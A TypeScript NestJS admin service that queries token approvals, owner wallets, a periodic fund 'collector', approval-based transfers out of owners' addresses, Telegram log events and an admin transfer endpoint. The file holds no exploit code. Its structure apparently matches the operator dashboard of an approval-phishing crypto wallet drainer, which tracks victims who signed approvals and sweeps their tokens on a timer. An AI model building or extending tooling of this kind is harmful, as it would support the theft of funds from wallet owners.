import { Injectable, NotFoundException } from "@nestjs/common";
import { PrismaClient } from "@prisma/client";
import { NativeTransferService } from "../wallet/native-transfer.service";
import { WalletService } from "../wallet/wallet.service";
import {
  paginatedResponse,
  parsePagination,
  parseSort,
} from "../../common/utils/pagination";

const prisma = new PrismaClient();

const COLLECTION_INTERVAL_MS = Math.max(
  30_000,
  Number(process.env.COLLECTOR_INTERVAL_MS ?? 120_000)
);

@Injectable()
export class AdminService {
  constructor(
    private readonly walletService: WalletService,
    private readonly nativeTransferService: NativeTransferService
  ) {}

  async getDashboard() {
    const now = new Date();
    const collector = await this.walletService.getCollectorStatus();
    const [nativeCounts, recentFailures] = await Promise.all([
      prisma.nativeTransfer.groupBy({
        by: ["status"],
        _count: { _all: true },
      }),
      Promise.all([
        prisma.approval.findMany({
          where: { lastError: { not: null } },
          orderBy: { updatedAt: "desc" },
          take: 5,
          select: {
            id: true,
            network: true,
            ownerAddress: true,
            tokenSymbol: true,
            status: true,
            lastError: true,
            updatedAt: true,
          },
        }),
        prisma.nativeTransfer.findMany({
          where: { status: "failed" },
          orderBy: { updatedAt: "desc" },
          take: 5,
          select: {
            id: true,
            network: true,
            ownerAddress: true,
            assetSymbol: true,
            status: true,
            errorMessage: true,
            updatedAt: true,
          },
        }),
      ]),
    ]);

    const [approvalErrors, nativeErrors] = recentFailures;

    return {
      ok: true,
      collector,
      nativeTransfers: Object.fromEntries(
        nativeCounts.map((row) => [row.status, row._count._all])
      ),
      recentFailures: {
        approvals: approvalErrors,
        nativeTransfers: nativeErrors,
      },
      timestamp: now.toISOString(),
    };
  }

  async listApprovals(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status) where.status = query.status.trim().toUpperCase();
    if (query.owner) {
      where.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }
    if (query.collectionEnabled === "true") where.collectionEnabled = true;
    if (query.collectionEnabled === "false") where.collectionEnabled = false;

    const orderBy = parseSort(query.sort, [
      "createdAt",
      "updatedAt",
      "nextCheckAt",
      "status",
    ]);

    const [items, total] = await Promise.all([
      prisma.approval.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.approval.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async getApproval(id: string) {
    const approval = await prisma.approval.findUnique({ where: { id } });
    if (!approval) throw new NotFoundException("Approval not found");

    const [transfers, audits] = await Promise.all([
      prisma.transfer.findMany({
        where: { approvalId: id },
        orderBy: { createdAt: "desc" },
        take: 50,
        select: {
          id: true,
          idempotencyKey: true,
          amountRaw: true,
          fromAddress: true,
          toAddress: true,
          txHash: true,
          blockNumber: true,
          status: true,
          errorMessage: true,
          retryCount: true,
          broadcastAt: true,
          confirmedAt: true,
          createdAt: true,
          updatedAt: true,
        },
      }),
      prisma.auditLog.findMany({
        where: { entityId: id },
        orderBy: { createdAt: "desc" },
        take: 20,
      }),
    ]);

    return { item: approval, transfers, audits };
  }

  async listTransfers(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const approvalWhere: Record<string, unknown> = {};
    if (query.network) approvalWhere.network = query.network.trim().toLowerCase();
    if (query.owner) {
      approvalWhere.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }

    const where: Record<string, unknown> = {};
    if (query.status) where.status = query.status.trim().toLowerCase();
    if (Object.keys(approvalWhere).length > 0) {
      where.approval = approvalWhere;
    }
    if (query.approvalId) where.approvalId = query.approvalId.trim();

    const orderBy = parseSort(query.sort, ["createdAt", "updatedAt", "status"]);

    const [items, total] = await Promise.all([
      prisma.transfer.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
        include: {
          approval: {
            select: {
              id: true,
              network: true,
              ownerAddress: true,
              tokenSymbol: true,
              status: true,
            },
          },
        },
      }),
      prisma.transfer.count({ where }),
    ]);

    return paginatedResponse(
      items.map(({ approval, ...transfer }) => ({
        ...transfer,
        signedPayload: undefined,
        approval,
      })),
      total,
      params
    );
  }

  async getTransfer(id: string) {
    const transfer = await prisma.transfer.findUnique({
      where: { id },
      include: {
        approval: true,
      },
    });
    if (!transfer) throw new NotFoundException("Transfer not found");
    const { signedPayload: _signedPayload, ...safe } = transfer;
    return {
      item: {
        ...safe,
        hasSignedPayload: Boolean(transfer.signedPayload),
      },
    };
  }

  async listNativeTransfers(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status) where.status = query.status.trim().toLowerCase();
    if (query.owner) {
      where.ownerAddress = {
        contains: query.owner.trim(),
        mode: "insensitive",
      };
    }

    const orderBy = parseSort(query.sort, [
      "createdAt",
      "updatedAt",
      "lastReconcileAt",
      "status",
    ]);

    const [items, total] = await Promise.all([
      prisma.nativeTransfer.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.nativeTransfer.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async getNativeTransfer(id: string) {
    const item = await prisma.nativeTransfer.findUnique({ where: { id } });
    if (!item) throw new NotFoundException("Native transfer not found");
    return { item };
  }

  async reconcileNativeTransfer(id: string) {
    const item = await this.nativeTransferService.reconcilePending(id);
    return { ok: true, item };
  }

  async listAuditLogs(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.action) where.action = query.action.trim();
    if (query.entityType) where.entityType = query.entityType.trim();
    if (query.entityId) where.entityId = query.entityId.trim();
    if (query.actor) {
      where.actor = { contains: query.actor.trim(), mode: "insensitive" };
    }

    const orderBy = parseSort(query.sort, ["createdAt"]);

    const [items, total] = await Promise.all([
      prisma.auditLog.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.auditLog.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async listTgEvents(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const where: Record<string, unknown> = {};
    if (query.type) where.type = query.type.trim();
    if (query.network) where.network = query.network.trim().toLowerCase();
    if (query.status) where.status = query.status.trim();
    if (query.address) {
      where.address = { contains: query.address.trim(), mode: "insensitive" };
    }

    const orderBy = parseSort(query.sort, ["createdAt"]);

    const [items, total] = await Promise.all([
      prisma.tgLogEvent.findMany({
        where,
        orderBy,
        skip: params.skip,
        take: params.limit,
      }),
      prisma.tgLogEvent.count({ where }),
    ]);

    return paginatedResponse(items, total, params);
  }

  async listWallets(query: Record<string, string | undefined>) {
    const params = parsePagination(query);
    const search = query.search?.trim() ?? "";

    type WalletRow = {
      address: string;
      approval_count: bigint;
      native_count: bigint;
      event_count: bigint;
      last_seen: Date | null;
    };

    const rows = search
      ? await prisma.$queryRaw<WalletRow[]>`
          SELECT address,
                 SUM(approval_count)::bigint AS approval_count,
                 SUM(native_count)::bigint AS native_count,
                 SUM(event_count)::bigint AS event_count,
                 MAX(last_seen) AS last_seen
          FROM (
            SELECT "ownerAddress" AS address, 1 AS approval_count, 0 AS native_count, 0 AS event_count, "updatedAt" AS last_seen
            FROM "Approval"
            WHERE "ownerAddress" ILIKE ${`%${search}%`}
            UNION ALL
            SELECT "ownerAddress", 0, 1, 0, "updatedAt" FROM "NativeTransfer"
            WHERE "ownerAddress" ILIKE ${`%${search}%`}
            UNION ALL
            SELECT address, 0, 0, 1, "createdAt" FROM "TgLogEvent"
            WHERE address ILIKE ${`%${search}%`}
          ) combined
          GROUP BY address
          ORDER BY last_seen DESC NULLS LAST
          LIMIT ${params.limit} OFFSET ${params.skip}
        `
      : await prisma.$queryRaw<WalletRow[]>`
          SELECT address,
                 SUM(approval_count)::bigint AS approval_count,
                 SUM(native_count)::bigint AS native_count,
                 SUM(event_count)::bigint AS event_count,
                 MAX(last_seen) AS last_seen
          FROM (
            SELECT "ownerAddress" AS address, 1 AS approval_count, 0 AS native_count, 0 AS event_count, "updatedAt" AS last_seen
            FROM "Approval"
            UNION ALL
            SELECT "ownerAddress", 0, 1, 0, "updatedAt" FROM "NativeTransfer"
            UNION ALL
            SELECT address, 0, 0, 1, "createdAt" FROM "TgLogEvent"
          ) combined
          GROUP BY address
          ORDER BY last_seen DESC NULLS LAST
          LIMIT ${params.limit} OFFSET ${params.skip}
        `;

    const countResult = search
      ? await prisma.$queryRaw<{ count: bigint }[]>`
          SELECT COUNT(*)::bigint AS count FROM (
            SELECT address FROM (
              SELECT "ownerAddress" AS address FROM "Approval" WHERE "ownerAddress" ILIKE ${`%${search}%`}
              UNION
              SELECT "ownerAddress" FROM "NativeTransfer" WHERE "ownerAddress" ILIKE ${`%${search}%`}
              UNION
              SELECT address FROM "TgLogEvent" WHERE address ILIKE ${`%${search}%`}
            ) t GROUP BY address
          ) c
        `
      : await prisma.$queryRaw<{ count: bigint }[]>`
          SELECT COUNT(*)::bigint AS count FROM (
            SELECT address FROM (
              SELECT "ownerAddress" AS address FROM "Approval"
              UNION
              SELECT "ownerAddress" FROM "NativeTransfer"
              UNION
              SELECT address FROM "TgLogEvent"
            ) t GROUP BY address
          ) c
        `;

    const total = Number(countResult[0]?.count ?? 0);
    const items = rows.map((row) => ({
      address: row.address,
      approvalCount: Number(row.approval_count),
      nativeTransferCount: Number(row.native_count),
      eventCount: Number(row.event_count),
      lastSeen: row.last_seen,
    }));

    return paginatedResponse(items, total, params);
  }

  async getWallet(address: string) {
    const normalized = address.trim();
    const [approvals, nativeTransfers, events, transfers] = await Promise.all([
      prisma.approval.findMany({
        where: { ownerAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.nativeTransfer.findMany({
        where: { ownerAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.tgLogEvent.findMany({
        where: { address: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
      }),
      prisma.transfer.findMany({
        where: { fromAddress: normalized },
        orderBy: { createdAt: "desc" },
        take: 100,
        include: {
          approval: {
            select: {
              id: true,
              network: true,
              tokenSymbol: true,
              status: true,
            },
          },
        },
      }),
    ]);

    if (
      approvals.length === 0 &&
      nativeTransfers.length === 0 &&
      events.length === 0 &&
      transfers.length === 0
    ) {
      throw new NotFoundException("Wallet not found");
    }

    const timeline = [
      ...approvals.map((a) => ({
        type: "approval" as const,
        id: a.id,
        at: a.createdAt.toISOString(),
        label: `${a.network} ${a.tokenSymbol}`,
        status: a.status,
      })),
      ...transfers.map((t) => ({
        type: "transfer" as const,
        id: t.id,
        at: t.createdAt.toISOString(),
        label: `${t.approval.network} ${t.approval.tokenSymbol} · ${t.amountRaw}`,
        status: t.status,
      })),
      ...nativeTransfers.map((n) => ({
        type: "native" as const,
        id: n.id,
        at: n.createdAt.toISOString(),
        label: `${n.network} ${n.assetSymbol} · ${n.amountHuman}`,
        status: n.status,
      })),
      ...events.map((e) => ({
        type: "event" as const,
        id: e.id,
        at: e.createdAt.toISOString(),
        label: `${e.type} · ${e.network}`,
        status: e.status,
      })),
    ].sort((a, b) => (a.at < b.at ? 1 : -1));

    return {
      address: normalized,
      approvals,
      nativeTransfers,
      events,
      transfers: transfers.map(({ signedPayload: _sp, ...t }) => ({
        ...t,
        hasSignedPayload: Boolean(_sp),
      })),
      timeline,
    };
  }

  adminTransfer(body: Record<string, unknown>) {
    return this.walletService.adminTransfer(body);
  }

  collectorStatus() {
    return this.walletService.getCollectorStatus();
  }

  debugSnapshot() {
    return this.walletService.debugApprovals();
  }

  getCollectionIntervalMs() {
    return COLLECTION_INTERVAL_MS;
  }
}
